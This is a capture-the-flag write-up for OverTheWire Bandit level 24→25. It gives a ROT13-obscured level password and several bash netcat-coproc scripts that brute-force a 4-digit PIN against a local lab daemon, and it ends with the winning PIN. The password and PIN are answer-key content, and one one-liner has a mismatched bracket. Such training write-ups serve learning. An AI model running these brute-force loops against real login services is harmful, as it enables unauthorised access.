# BANDIT 24 -> 25

## Obfuscated password (ROT13): 

	vPv86ggG4XFAr1nezXvjoDAzO3LWC3d4

## OBJECTIVE

	"A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

	You do not need to create new connections each time"


## PURPOSE


## SOLUTIONS

	~BEST~
	coproc ncproc { nc localhost 30002; }; read -r <&"${ncproc[0]}"; for i in {0000..9999}; do echo "[previous password[ $i" >&"${ncproc[1]}"; read -r r <&"${ncproc[0]}"; [[ $r != Wrong* ]] && echo "[+] $i $r" && break; done


	~SECOND BEST~

	coproc ncproc { nc localhost 30002; } && IFS= read -r banner <&"${ncproc[0]}" && for pin in $(seq -w 0000 9999); do echo "[previous password] $pin" >&"${ncproc[1]}"; IFS= read -r res <&"${ncproc[0]}"; echo "$pin → $res"; [[ $res != "Wrong!"* && -n $res ]] && echo "[+] $pin" && break; done; exec {ncproc[0]}>&-; exec {ncproc[1]}>&-


	~OR~

	#!/bin/bash
	
	password="[previous password]"
	
	# Start nc once
	coproc ncproc { nc localhost 30002; }
	
	# Read and show banner
	IFS= read -r banner <&"${ncproc[0]}"
	echo "[Banner] $banner"
	
	# Bruteforce loop
	for pin in $(seq -w 0000 9999); do
	  attempt="${password} ${pin}"   # <-- space between password and PIN!
	  echo "$attempt" >&"${ncproc[1]}"
	  IFS= read -r response <&"${ncproc[0]}"
	
	  echo "$pin → $response" | tee -a seq25.txt
	
	  if [[ "$response" != "Wrong! Please enter the correct current password and pincode. Try again." && -n "$response" ]]; then
	    echo "[+] Success with PIN $pin"
	    break
	  fi
	done
	
	# Clean up
	exec {ncproc[0]}>&-
	exec {ncproc[1]}>&-

	~OR~

	seq -f "[previous password]0000 %04g" 2200 2300 | nc localhost 30002 | tee -a seq25.txt
	cat seq25.txt | uniq -u


	~END~

	echo "[previous password] 2219" | nc localhost 30002
